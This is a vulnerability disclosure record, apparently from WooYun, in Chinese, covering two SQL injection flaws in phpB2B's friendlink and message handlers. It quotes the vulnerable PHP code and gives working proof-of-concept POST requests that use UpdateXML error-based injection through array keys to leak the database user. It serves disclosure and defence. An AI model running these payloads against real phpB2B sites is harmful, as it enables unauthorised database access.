{"id": 36477, "wybug_id": "wooyun-2015-0101764", "wybug_title": "phpb2b最新版两处sql注入#2", "wybug_corp": "phpb2b.com", "wybug_author": "路人甲", "wybug_date": "2015-03-17 19:10", "wybug_open_date": "2015-06-20 19:13", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-22：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-20：\t细节向公众公开  简要描述： RT 详细说明：  在friendlink_control.php中：\nfunction add()        {                global $smarty;                using( \"message\");                $pms = new Messages();                if (isset($_POST['do']) && !empty($_POST['friendlink'])) {                        pb_submit_check('friendlink');                        $data = $_POST['friendlink'];                        $result = false;                        $data['status'] = 0;                        $data['created'] = $data['modified'] = $this->friendlink->timestamp;                        $result = $this->friendlink->save($data);                        if ($result) {                                $pms->SendToAdmin('', array(                                \"title\"=>$data['title'].L(\"apply_friendlink\"),                                \"content\"=>$data['title'].L(\"apply_friendlink\").\"\\n\".$_POST['data']['email'].\"\\n\".$data['description'],                                ));                                flash('wait_apply');                        }                }else{                        flash();                }        }\n程序中有这样一段代码：$data=$_POST['friendlink']，然后程序在后面为$data赋值，从赋值的形式来看，知道$data是一个数组。既然是数组 我们就可以利用POST提交一个friendlink[]=XXX  这种形式的数据上去，就可以覆盖控制$data的数组值。然后程序执行了$result = $this->friendlink->save($data);\nfunction save($posts, $action=null, $id=null, $tbname = null, $conditions = null, $if_check_word_ban = false)        {                $new_id = $result = false;                $keys = array_keys($posts);                $cols = implode($keys,\",\");                $tbname = (is_null($tbname))? $this->getTable():trim($tbname);                $this->table_name = $tbname;                //Todo:2010.04.14, by steven                if(!empty($id)){                        $sql = \"SELECT $cols FROM \".$tbname.\" WHERE \".$this->primaryKey.\"='\".$id.\"'\";                }elseif(!empty($posts[$this->primaryKey])){                        $sql = \"SELECT $cols FROM \".$tbname.\" WHERE \".$this->primaryKey.\"='\".$posts[$this->primaryKey].\"'\";                }else{                        $sql = \"SELECT $cols FROM \".$tbname.\" WHERE \".$this->primaryKey.\"='-1'\";                }                if (!is_null($conditions)) {                        if (!empty($conditions)) {                                if (is_array($conditions)) {                                        $condition = implode(\" AND \", $conditions);                                }else{                                        $condition = $conditions;                                }                        }                        $sql.= \" AND \".$condition;                }                $rs = $this->dbstuff->Execute($sql);\n以上是save方法的一部分，其中$posts就是之前的$data，并且是一个数组形式，key和value都可控。接着程序获取了$posts的keys，并且将其转换为字符串，最后入到到sql语句中执行。 由于注入点是column  所以我们只需要一个注释符就可以实现注入。POC:   phpb2b/index.php?do=friendlink&action=addpost:   friendlink[(UpdateXML(1,CONCAT(0x5b,user(),0x5d),1))%23]=1&do=1&friendlink[id]=1&formhash=02d40d85c2dd1208&is_ajax=1这里的formhash是一个token，可以页面上的表单中获取。这里开启debug方便测试（实际情况下可以使用盲注）\n\n漏洞二:  在文件message_control.php中：\nfunction add()        {                global $pb_user, $smarty, $administrator_id;                if (isset($_POST['companyid']) && !empty($_POST['feed']) && !empty($pb_user['pb_userid'])) {                        $vals = $_POST['feed'];                        $vals['created'] = $this->message->timestamp;                        $vals['status'] = 0;                        $vals['from_member_id'] = $pb_user['pb_userid'];                        $vals['cache_from_username'] = $pb_user['pb_username'];                        $member_id = $this->message->GetOne(\"SELECT member_id FROM {$this->message->table_prefix}companies WHERE id=\".intval($_POST['companyid']));                        if (empty($member_id)) {                                $vals['to_member_id'] = $administrator_id;                                $vals['cache_to_username'] = $this->message->GetOne(\"SELECT username FROM {$this->message->table_prefix}members WHERE id=\".$administrator_id);                        }else{                                $member_info = $this->message->GetRow(\"SELECT id,username FROM {$this->message->table_prefix}members WHERE id=\".$member_id);                                $vals['to_member_id'] = $member_info['id'];                                $vals['cache_to_username'] = $member_info['username'];                        }                        $vals['title'] = L(\"pms_from_space\", \"tpl\");                        if($this->message->save($vals)){                                $smarty->flash('feedback_already_submit', null, 0);                        }                }        }\n我们看到同样$vals=$_POST['feed']，然后将$vals导入到了save方法,漏洞的形成和上面的一样。不再累赘.POC： phpb2b/index.php?do=message&action=addpost:  feed[(UpdateXML(1,CONCAT(0x5b,user(),0x5d),1))%23]=1&do=1&friendlink[id]=1&formhash=02d40d85c2dd1208&companyid=1\n\n   漏洞证明：  POC： phpb2b/index.php?do=message&action=addpost:  feed[(UpdateXML(1,CONCAT(0x5b,user(),0x5d),1))%23]=1&do=1&friendlink[id]=1&formhash=02d40d85c2dd1208&companyid=1\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-20 19:13 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}